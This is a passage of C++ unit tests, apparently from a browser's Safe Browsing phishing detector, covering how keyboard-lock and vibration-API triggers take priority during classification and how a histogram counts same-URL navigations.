  base::RunLoop().RunUntilIdle();

  // Now start Tier 1 (KEYBOARD_LOCK_REQUESTED) via WebContentsObserver.
  csd_host_->KeyboardLockRequested();
  base::RunLoop().RunUntilIdle();

  // Now KEYBOARD_LOCK_REQUESTED is in the renderer classification phase
  // (is_classifying_ = true).
  EXPECT_TRUE(fake_phishing_detector_.phishing_detection_started());

  // 2. Start a Tier 2 trigger (VIBRATION_API) via WebContentsObserver.
  // KEYBOARD_LOCK_REQUESTED (Tier 1) should block VIBRATION_API (Tier 2).
  csd_host_->VibrationRequested();

  // Verification: VIBRATION_API should be blocked.
  histogram_tester_.ExpectBucketCount(
      "SBClientPhishing.BlockingRequestType.VibrationApi",
      ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED, 1);
}

TEST_F(ClientSideDetectionHostPriorityTest,
       LowPriorityTriggerNotBlockedAfterHighPriorityPreClassificationFails) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  NavigateAndCommit(url_);
  base::RunLoop().RunUntilIdle();

  // Set up allowlist to match so that pre-classification fails/stops.
  // Note: we need to configure probability to accept it.
  SetHighConfidenceAllowlistAcceptanceRate(1.0f);
  database_manager_->SetAllowlistLookupDetailsForUrl(url_, /*match=*/true);

  // 1. Start a Tier 1 trigger (KEYBOARD_LOCK_REQUESTED)
  csd_host_->KeyboardLockRequested();
  base::RunLoop().RunUntilIdle();

  // Now KEYBOARD_LOCK_REQUESTED pre-classification is done and stopped.
  // is_classifying_ = false. classification_request_ is still alive but
  // ShouldClassifyForPhishing() is false.

  base::test::TestFuture<ClientSideDetectionType> started_future;
  csd_host_->set_preclassification_started_callback_for_testing(
      started_future.GetRepeatingCallback());

  // 2. Start a Tier 2 trigger (VIBRATION_API)
  csd_host_->VibrationRequested();

  // Verification: VIBRATION_API should NOT be blocked.
  EXPECT_EQ(started_future.Take(), ClientSideDetectionType::VIBRATION_API);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.BlockingRequestType.VibrationApi", 0);
}

TEST_F(ClientSideDetectionHostPriorityTest,
       LowPriorityTriggerNotBlockedAfterHighPriorityClassificationFinishes) {
  if (base::FeatureList::IsEnabled(kClientSideDetectionKillswitch)) {
    GTEST_SKIP();
  }

  fake_phishing_detector_.set_hold_phishing_detection_callback(true);

  NavigateAndCommit(url_);
  base::RunLoop().RunUntilIdle();

  // Reset the fake phishing detector so we don't confuse the TRIGGER_MODELS
  // ping from navigation with the KEYBOARD_LOCK_REQUESTED ping.
  fake_phishing_detector_.Reset();
  base::RunLoop().RunUntilIdle();

  base::test::TestFuture<ClientSideDetectionType> started_future1;
  csd_host_->set_preclassification_started_callback_for_testing(
      started_future1.GetRepeatingCallback());

  // 1. Start a Tier 1 trigger (KEYBOARD_LOCK_REQUESTED)
  csd_host_->KeyboardLockRequested();

  EXPECT_EQ(started_future1.Take(),
            ClientSideDetectionType::KEYBOARD_LOCK_REQUESTED);
  base::RunLoop().RunUntilIdle();

  // If classification started, finish it.
  if (fake_phishing_detector_.phishing_detection_started()) {
    fake_phishing_detector_.RunHeldPhishingDetectionCallback();
    base::RunLoop().RunUntilIdle();
  }

  // Now is_classifying_ is false.

  base::test::TestFuture<ClientSideDetectionType> started_future2;
  csd_host_->set_preclassification_started_callback_for_testing(
      started_future2.GetRepeatingCallback());

  // 2. Start a Tier 2 trigger (VIBRATION_API)
  csd_host_->VibrationRequested();

  // Verification: VIBRATION_API should NOT be blocked.
  EXPECT_EQ(started_future2.Take(), ClientSideDetectionType::VIBRATION_API);
  histogram_tester_.ExpectTotalCount(
      "SBClientPhishing.BlockingRequestType.VibrationApi", 0);
}

class ClientSideDetectionHostNewObserversTest
    : public ClientSideDetectionHostTest {
 public:
  ClientSideDetectionHostNewObserversTest() {
    feature_list_.InitAndEnableFeature(kClientSideDetectionNewObservers);
  }

 private:
  base::test::ScopedFeatureList feature_list_;
};

TEST_F(ClientSideDetectionHostNewObserversTest, SameURLAtPrimaryPageChanged) {
  base::HistogramTester histogram_tester;
  GURL url("http://host.com/");
  database_manager_->SetAllowlistLookupDetailsForUrl(url, false);

  // Navigate to URL1 and commit.
  NavigateAndCommit(url);
  histogram_tester.ExpectTotalCount(
      "SBClientPhishing.SameURLAtPrimaryPageChanged", 0);

  // Navigate to the same URL without reload.
  NavigateAndCommit(url);
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.SameURLAtPrimaryPageChanged", true, 1);

  // Navigate to the same URL with reload transition.
  controller().LoadURL(url, content::Referrer(), ui::PAGE_TRANSITION_RELOAD,
                       std::string());
  content::WebContentsTester::For(web_contents())->CommitPendingNavigation();

  // Histogram count should not increase.
  histogram_tester.ExpectUniqueSample(
      "SBClientPhishing.SameURLAtPrimaryPageChanged", true, 1);
}

}  // namespace safe_browsing
